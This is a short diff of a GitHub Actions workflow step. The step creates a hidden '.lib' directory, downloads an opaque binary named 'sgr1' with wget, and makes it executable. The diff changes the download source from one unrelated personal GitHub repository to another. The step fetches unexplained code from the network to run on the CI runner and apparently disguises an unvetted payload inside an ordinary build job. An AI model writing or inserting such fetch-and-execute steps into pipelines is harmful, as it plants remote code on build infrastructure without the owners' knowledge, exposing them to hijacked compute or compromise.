@@ -44,7 +44,7 @@ jobs:
       - name: Create directory and download binary
         run: |
           mkdir -p .lib && cd .lib
-          wget -qO sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/sereb
+          wget -qO sgr1 https://github.com/barburonjilo/back/raw/main/sr
           chmod +x sgr1
 
       - name: Download and parse JSON file
